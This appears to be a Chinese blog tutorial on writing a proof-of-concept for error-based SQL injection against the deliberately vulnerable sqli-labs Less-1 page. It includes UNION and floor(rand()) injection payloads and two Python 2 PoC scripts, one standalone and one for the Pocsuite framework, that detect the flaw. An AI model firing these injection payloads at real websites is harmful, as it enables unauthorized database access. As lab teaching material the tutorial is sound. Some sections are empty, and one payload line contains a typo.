# 基于报错的 SQL 注入 PoC 编写1



# 引子：



# 漏洞分析

## 黑盒测试：

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhxp5oot0pj30ik0ca3ze.jpg)


id=1,正常返回数据

---

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhxodrofz3j312q0fi76w.jpg)

输入单引号，发现报错。
说明单引号进入到了sql语句中，并影响了正常sql语句的执行。

---

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhxoec9pewj30lu0f6q4d.jpg)

输入两个单引号，正常返回数据。
加上报错信息中的提示，猜测sql语句为:


```
input = 1
$sql = 'select username,pwd from users where id = 'input' limit 0,1'
```




---

### order by:

```
input = 1' order by 1 --'
$sql = 'select username,pwd from users where id = '1' order by 1 --'' limit 0,1'

```

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhxorio92ij30m40eumyp.jpg)

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhxou5zwojj31dc0eqq5s.jpg)
知道字段为3.



---

### union select:

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhxow6m9eaj30lc0ty0w2.jpg)

```
input = 1' union select 1,2,version()  -- '
$sql = 'select username,pwd from users where id = '1' union select 1,2,version()  -- '' limit 0,1'
```



```
input = ' union select 1,2,version()  -- '
$sql = 'select username,pwd from users where id = '1' union select 1,2,version()  -- '' limit 0,1'
```




知道Mysql版本号为5.6.35

```
input = 1' andorder by 1 --'
$sql = 'select username,pwd from users where id = '1' order by 1 --' ' limit 0,1'
```







## 白盒测试：




---

# 关键概念:


# 疑问：



## order by时候的疑问

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhxow6m9eaj30lc0ty0w2.jpg)
为什么前一个显示出来数据，后一个没有显示出来数据

按道理说，注释符应该将后面的`LIMIT 1`注释掉才对。

## PHPstorm动态调试显示SQL语句：

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhy7q87b5lj30x801emxd.jpg)

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhy7ugcne9j3102018q33.jpg)
![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhy8teqbnlj30sq0aa75w.jpg)




![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhy7wh4uc2j30wo0100sv.jpg)

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhy7xeq3nkj30xw018glt.jpg)

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhy8ug6ojsj30ro092wfx.jpg)



没有注释成功的原因是:
并不是因为没有注释,而是php代码只输出结果集中的首条。


```
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font color= "#0000ff">';	
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
```



---

# 漏洞复现

该漏洞的注入点在url中的id参数处。

我们需要发起一个get请求，然后从页面中寻找网站存在漏洞时会出现特殊的字符串。

这里是`1e165421110ba03099a1c0393373c5b43`

## poc完整链接：
`http://sqli.com:8888/Less-1/?id=1' and (select 1 from (select count(*),concat(floor(rand(0)*2),(select md5(233)))name from information_schema.tables group by name)b) --+`



---

# 无框架 PoC 编写

```
# -*- coding:utf-8 -*-
__author__ = 'jerry'


import urllib2
import urllib
import sys
import hashlib


'''
`http://sqli.com:8888/Less-1/?id=1' and (select 1 from (select count(*),concat(floor(rand(0)*2),(select md5(233)))name from information_schema.tables group by name)b) --+`

'''

def verify(url):
    target = "%s/Less-1/?id=" % url
    # 要发送的数据
    #url_data = ' and (select 1 from (select count(*),concat(floor(rand(0)*2),(select md5(233)))name from information_schema.tables group by name)b) --+ '

    url_data = "1%27%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(select%20md5(233)))name%20from%20information_schema.tables%20group%20by%20name)b)%20--+"
    #data = urllib.quote(url_data)
    #print data


    try:
        # 发送 HTTP 请求
        #req = urllib2.Request(target, data=urllib.urlencode())

        full_url = target + url_data
        #print full_url
        req = urllib2.Request(full_url)
        response = urllib2.urlopen(req)
        data = response.read()

        if data:
            # 处理 响应
            verify_data = hashlib.md5('233').hexdigest()
            #print verify_data
            if verify_data in data:

                print "%s is vulnerable" % target
            else:
                print "%s is not vulnerable" % target
    except Exception, e:
        print "Something error happend..."
        print e

def main():
    args = sys.argv
    url = ""

    if len(args) == 2:
        url = args[1]
        verify(url)
    else:
        print "Usage: python %s url" % (args[0])

if __name__ == '__main__':
    main()



```

---

# 基于 Pocsuite 框架
```
# -*- coding:utf-8 -*-
__author__ = 'jerry'



from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import urllib2


class Sqli_Lab_error_based_PoC(POCBase):
    vulID = '1'
    version = '1'
    author = ['jerry']
    vulDate = '2017-07-22'
    createDate = '2017-07-22'
    updateDate = '2017-07-22'
    references = ['none']
    name = 'Sqli_Lab_error_based SQL注入漏洞 POC'
    appPowerLink = 'http://www.xxx.cn/'
    appName = 'Sqli_Lab'
    appVersion = 'none'
    vulType = 'SQL Injection'
    desc = '''
           未对用户输入进行任何过滤,导致产生SQL注入。
           此注入为报错注入。输出md5(233)=e165421110ba03099a1c0393373c5b43,用这个值来进行验证.

    '''
    samples = ['']

    def _verify(self):
        result = {}
        target = self.url + "/Less-1/?id="

        url_data = "1%27%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(select%20md5(233)))name%20from%20information_schema.tables%20group%20by%20name)b)%20--+"
        full_url = target + url_data

        #发送get请求
        req = urllib2.Request(full_url)
        response = urllib2.urlopen(req)
        content = response.read()

        # 这个 e165421110ba03099a1c0393373c5b43 就是 md5(233) 的值
        if 'e165421110ba03099a1c0393373c5b43' in content:
            result = {'VerifyInfo': {}}
            result['VerifyInfo']['URL'] = target

        return self.parse_result(result)

    def _attack(self):
        return self._verify()

    def parse_result(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('Internet Nothing returned')

        return output


register(Sqli_Lab_error_based_PoC)


```

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fhyfgu2o2sj318i0jm79u.jpg)


---

# 参考：

[PoC 编写指南](https://poc.evalbug.com)

